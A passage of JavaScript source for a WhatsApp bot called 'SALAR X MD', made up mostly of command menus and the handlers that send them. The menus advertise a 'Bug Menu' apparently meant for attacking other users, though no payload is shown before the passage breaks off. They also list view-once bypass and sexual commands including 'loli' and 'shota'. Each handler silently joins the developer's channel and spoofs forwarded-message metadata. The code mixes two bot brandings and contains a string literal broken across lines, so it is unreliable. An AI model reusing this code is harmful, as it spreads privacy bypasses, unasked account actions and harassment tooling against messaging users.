│❖ ${prefix}style1917
│❖ ${prefix}summerbeach
│❖ ${prefix}typographytext
│❖ ${prefix}underwatertext
│❖ ${prefix}watercolortext
│❖ ${prefix}writetext
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐎𝐖𝐍𝐄𝐑* ◆━━┓
│❖ .
│❖ ${prefix}addsudo
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}autobio
│❖ ${prefix}autoreact
│❖ ${prefix}autoread
│❖ ${prefix}autorecording
│❖ ${prefix}autorecordtype
│❖ ${prefix}autoreply
│❖ ${prefix}autotyping
│❖ ${prefix}autoviewstatus
│❖ ${prefix}ban
│❖ ${prefix}banuser
│❖ ${prefix}banuser1
│❖ ${prefix}block
│❖ ${prefix}broadcast
│❖ ${prefix}delsudo
│❖ ${prefix}getsudo
│❖ ${prefix}listban
│❖ ${prefix}listbanuser
│❖ ${prefix}listsudo
│❖ ${prefix}private
│❖ ${prefix}public
│❖ ${prefix}self
│❖ ${prefix}setpp
│❖ ${prefix}setsudo
│❖ ${prefix}setprefix
│❖ ${prefix}sudo
│❖ ${prefix}unban
│❖ ${prefix}unbanuser
│❖ ${prefix}unbanuser1
│❖ ${prefix}unblock
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐒𝐓𝐈𝐂𝐊𝐄𝐑* ◆━━┓
│❖ ${prefix}awoo
│❖ ${prefix}bite
│❖ ${prefix}blush
│❖ ${prefix}bonk
│❖ ${prefix}bully
│❖ ${prefix}cringe
│❖ ${prefix}cry
│❖ ${prefix}cuddle
│❖ ${prefix}dance
│❖ ${prefix}glomp
│❖ ${prefix}handhold
│❖ ${prefix}happy
│❖ ${prefix}highfive
│❖ ${prefix}hug
│❖ ${prefix}kill
│❖ ${prefix}kiss
│❖ ${prefix}lick
│❖ ${prefix}nom
│❖ ${prefix}pat
│❖ ${prefix}poke
│❖ ${prefix}qc
│❖ ${prefix}s
│❖ ${prefix}shinobu
│❖ ${prefix}slap
│❖ ${prefix}smile
│❖ ${prefix}smug
│❖ ${prefix}steal
│❖ ${prefix}sticker
│❖ ${prefix}stickerthf
│❖ ${prefix}stickerwm
│❖ ${prefix}take
│❖ ${prefix}tosticker
│❖ ${prefix}wave
│❖ ${prefix}wink
│❖ ${prefix}wm
│❖ ${prefix}yeet
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐓𝐎𝐎𝐋𝐒* ◆━━┓
│❖ ${prefix}calculate
│❖ ${prefix}calculator
│❖ ${prefix}cartoonify
│❖ ${prefix}currency
│❖ ${prefix}currencies
│❖ ${prefix}define
│❖ ${prefix}dictionary
│❖ ${prefix}genpass
│❖ ${prefix}myip
│❖ ${prefix}qrcode
│❖ ${prefix}readqr
│❖ ${prefix}readmore
│❖ ${prefix}removebg
│❖ ${prefix}remind
│❖ ${prefix}shorturl
│❖ ${prefix}tomp3
│❖ ${prefix}tomp4
│❖ ${prefix}toimg
│❖ ${prefix}tourl
│❖ ${prefix}translate
│❖ ${prefix}url
│❖ ${prefix}weather
│❖ ${prefix}weather2
│❖ ${prefix}weatherinfo
│❖ ${prefix}wiki
│❖ ${prefix}wikipedia
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐕𝐎𝐈𝐂𝐄* ◆━━┓
│❖ ${prefix}bass
│❖ ${prefix}blown
│❖ ${prefix}deep
│❖ ${prefix}earrape
│❖ ${prefix}fast
│❖ ${prefix}fat
│❖ ${prefix}gtts
│❖ ${prefix}nightcore
│❖ ${prefix}reverse
│❖ ${prefix}robot
│❖ ${prefix}say
│❖ ${prefix}slow
│❖ ${prefix}smooth
│❖ ${prefix}squirrel
│❖ ${prefix}tts
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐎𝐓𝐇𝐄𝐑* ◆━━┓
│❖ ${prefix}😭
│❖ ${prefix}account
│❖ ${prefix}alive
│❖ ${prefix}aza
│❖ ${prefix}buy-panel
│❖ ${prefix}cat
│❖ ${prefix}checkmail
│❖ ${prefix}checkmails
│❖ ${prefix}coffee
│❖ ${prefix}del
│❖ ${prefix}delete
│❖ ${prefix}delmail
│❖ ${prefix}delpair
│❖ ${prefix}deltemp
│❖ ${prefix}deltmp
│❖ ${prefix}deletemail
│❖ ${prefix}dog
│❖ ${prefix}download
│❖ ${prefix}fox
│❖ ${prefix}freebot
│❖ ${prefix}gellltbot
│❖ ${prefix}getpp
│❖ ${prefix}git
│❖ ${prefix}idch
│❖ ${prefix}inbox
│❖ ${prefix}jid
│❖ ${prefix}kopi
│❖ ${prefix}listpair
│❖ ${prefix}mode
│❖ ${prefix}newmail
│❖ ${prefix}nsbxmdmfw
│❖ ${prefix}owner
│❖ ${prefix}pair
│❖ ${prefix}panda
│❖ ${prefix}paptt
│❖ ${prefix}ping
│❖ ${prefix}poem
│❖ ${prefix}prog
│❖ ${prefix}progquote
│❖ ${prefix}random-girl
│❖ ${prefix}react-ch
│❖ ${prefix}rch
│❖ ${prefix}react-channel
│❖ ${prefix}reactbcnch
│❖ ${prefix}reademail
│❖ ${prefix}readmail
│❖ ${prefix}readviewonce2
│❖ ${prefix}repo
│❖ ${prefix}runtime
│❖ ${prefix}save
│❖ ${prefix}speed
│❖ ${prefix}svt
│❖ ${prefix}tempmail
│❖ ${prefix}tempmail2
│❖ ${prefix}tempmail-inbox
│❖ ${prefix}test
│❖ ${prefix}tmpmail
│❖ ${prefix}vkfkk
│❖ ${prefix}vv
│❖ ${prefix}vv2
│❖ ${prefix}vvgh
│❖ ${prefix}xnxx
│❖ ${prefix}xvideosearch
│❖ ${prefix}xnxxvideodl
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

                // TRY-CATCH for image sending with fallback to text only
try {
    const mediaContent = await prepareWAMessageMedia(
        { image: { url: randomImage } },
        { upload: devtrust.waUploadToServer }
    );

    const menuMsg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: true,
                        ...mediaContent
                    }),
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menuText
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗'
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            proto.Message.InteractiveMessage.NativeFlowMessage.NativeFlowButton.create({
                                name: 'cta_url',
                                buttonParamsJson: JSON.stringify({
                                    display_text: '📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟',
                                    url: 'https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r'
                                })
                            })
                        ]
                    }),
                    contextInfo: proto.ContextInfo.create({
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: proto.Message.InteractiveMessage.create({
                            newsletterJid: '120363427254972269@newsletter',
                            newsletterName: '© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗',
                            serverMessageId: -1
                        })
                    })
                })
            }
        }
    }, { quoted: m, userJid: devtrust.user.jid });

    await devtrust.relayMessage(from, menuMsg.message, { messageId: menuMsg.key.id });

} catch (imageError) {
    console.log('❌ Menu failed:', imageError.message);
    await devtrust.sendMessage(from, { text: menuText }, { quoted: m });
}
            }
                break;

            case 'menu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝐃𝐎𝐑𝐀 𝐗 𝐌𝐃 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝐃𝐎𝐑𝐀 𝐗 𝐌𝐃* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝐃𝐎𝐑𝐀 𝐗 𝐌𝐃* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *ᴩᴀɪʀ:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝐃𝐎𝐑𝐀 𝐗 𝐌𝐃 - 𝐌𝐄𝐍𝐔 𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒* ◆━━┓
│❖ ${prefix}ʙᴜɢᴍᴇɴᴜ
│❖ ${prefix}ᴏᴡɴᴇʀᴍᴇɴᴜ
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐃𝐎𝐑𝐀* | © 2026
`;

                // TRY-CATCH for image sending with fallback to text only
// TRY-CATCH for image sending with fallback to text only
try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    interactiveMessage: {
      header: {
        title: "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
        subtitle: "Tap a category below",
        hasMediaAttachment: true,
        ...media
      },
      body: {
        text: menuText
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "📋 Open Menu",
              sections: [
                {
                  title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                  highlight_label: "Menu",
                  rows: [
                    { title: "🐛 𝐁ᴜɢ 𝐌ᴇɴᴜ", description: "Bug commands", id: ".bugmenu" },
                    { title: "👑 𝐎ᴡɴᴇʀ 𝐌ᴇɴᴜ", description: "Owner commands", id: ".ownermenu" }
                  ]
                }
              ]
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "📢 CHANNEL",
              url: "
              https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              merchant_url: "
              https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
            })
          }
        ]
      },
      contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363427254972269@newsletter",
          newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑",
          serverMessageId: -1
        },
        externalAdReply: {
          showAdAttribution: true,
          title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
          body: "Tap to open the menu",
          thumbnailUrl: randomImage,
          mediaUrl: randomImage,
          sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback to avoid empty response
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'aimenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗ai': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐀𝐈* ◆━━┓
│❖ ${prefix}raju
│❖ ${prefix}raju-active
│❖ ${prefix}raju-off
│❖ ${prefix}ai
│❖ ${prefix}codeai
│❖ ${prefix}deepseek
│❖ ${prefix}gemini
│❖ ${prefix}gemivbnni
│❖ ${prefix}gpt
│❖ ${prefix}gpt3
│❖ ${prefix}gpt4
│❖ ${prefix}gpt5
│❖ ${prefix}grok
│❖ ${prefix}grovnnk-ai
│❖ ${prefix}metaai
│❖ ${prefix}metabcn-ai
│❖ ${prefix}photoai
│❖ ${prefix}qwen
│❖ ${prefix}qwenxj
│❖ ${prefix}storyai
│❖ ${prefix}triviaai
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

                // TRY-CATCH for image sending with fallback to text only
                try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'animemenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗anime': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐀𝐍𝐈𝐌𝐄* ◆━━┓
│❖ ${prefix}akiyama
│❖ ${prefix}ana
│❖ ${prefix}animebite
│❖ ${prefix}animeblush
│❖ ${prefix}animebonk
│❖ ${prefix}animebully
│❖ ${prefix}animecringe
│❖ ${prefix}animedance
│❖ ${prefix}animedl
│❖ ${prefix}animeglomp
│❖ ${prefix}animehappy
│❖ ${prefix}animehighfive
│❖ ${prefix}animekill
│❖ ${prefix}animelick
│❖ ${prefix}animepoke
│❖ ${prefix}animesearch
│❖ ${prefix}animesmile
│❖ ${prefix}animesmug
│❖ ${prefix}animewave
│❖ ${prefix}animewink
│❖ ${prefix}animewlp
│❖ ${prefix}animeyeet
│❖ ${prefix}art
│❖ ${prefix}asuna
│❖ ${prefix}ayuzawa
│❖ ${prefix}bluearchive
│❖ ${prefix}boruto
│❖ ${prefix}bts
│❖ ${prefix}cartoon
│❖ ${prefix}cecan
│❖ ${prefix}chiho
│❖ ${prefix}chinagirl
│❖ ${prefix}chitoge
│❖ ${prefix}cogan
│❖ ${prefix}cosplay
│❖ ${prefix}cosplayloli
│❖ ${prefix}cosplaysagiri
│❖ ${prefix}𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗
│❖ ${prefix}deidara
│❖ ${prefix}doraemon
│❖ ${prefix}elaina
│❖ ${prefix}emilia
│❖ ${prefix}erza
│❖ ${prefix}exo
│❖ ${prefix}femdom
│❖ ${prefix}freefire
│❖ ${prefix}gamewallpaper
│❖ ${prefix}glasses
│❖ ${prefix}gremory
│❖ ${prefix}hacker
│❖ ${prefix}hentai
│❖ ${prefix}hestia
│❖ ${prefix}husbu
│❖ ${prefix}inori
│❖ ${prefix}islamic
│❖ ${prefix}isuzu
│❖ ${prefix}itachi
│❖ ${prefix}itori
│❖ ${prefix}jennie
│❖ ${prefix}jiso
│❖ ${prefix}justina
│❖ ${prefix}kaga
│❖ ${prefix}kagura
│❖ ${prefix}kakashi
│❖ ${prefix}kaori
│❖ ${prefix}keneki
│❖ ${prefix}kotori
│❖ ${prefix}kpop
│❖ ${prefix}kucing
│❖ ${prefix}kurumi
│❖ ${prefix}lisa
│❖ ${prefix}loli
│❖ ${prefix}madara
│❖ ${prefix}manga
│❖ ${prefix}megumin
│❖ ${prefix}mikasa
│❖ ${prefix}mikey
│❖ ${prefix}miku
│❖ ${prefix}minato
│❖ ${prefix}mobile
│❖ ${prefix}moe
│❖ ${prefix}motor
│❖ ${prefix}mountain
│❖ ${prefix}naruto
│❖ ${prefix}neko
│❖ ${prefix}neko2
│❖ ${prefix}nekonime
│❖ ${prefix}nezuko
│❖ ${prefix}nsfw
│❖ ${prefix}onepiece
│❖ ${prefix}pentol
│❖ ${prefix}pokemon
│❖ ${prefix}profil
│❖ ${prefix}programming
│❖ ${prefix}pubg
│❖ ${prefix}randblackpink
│❖ ${prefix}randomnime
│❖ ${prefix}randomnime2
│❖ ${prefix}rize
│❖ ${prefix}rose
│❖ ${prefix}ryujin
│❖ ${prefix}sagiri
│❖ ${prefix}sakura
│❖ ${prefix}sasuke
│❖ ${prefix}satanic
│❖ ${prefix}sfw
│❖ ${prefix}shina
│❖ ${prefix}shinka
│❖ ${prefix}shinomiya
│❖ ${prefix}shizuka
│❖ ${prefix}shota
│❖ ${prefix}shortquote
│❖ ${prefix}space
│❖ ${prefix}technology
│❖ ${prefix}tejina
│❖ ${prefix}toukachan
│❖ ${prefix}tsunade
│❖ ${prefix}waifu
│❖ ${prefix}wallhp
│❖ ${prefix}wallml
│❖ ${prefix}wallmlnime
│❖ ${prefix}yotsuba
│❖ ${prefix}yuki
│❖ ${prefix}yulibocil
│❖ ${prefix}yumeko
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'bugmenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗bug': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
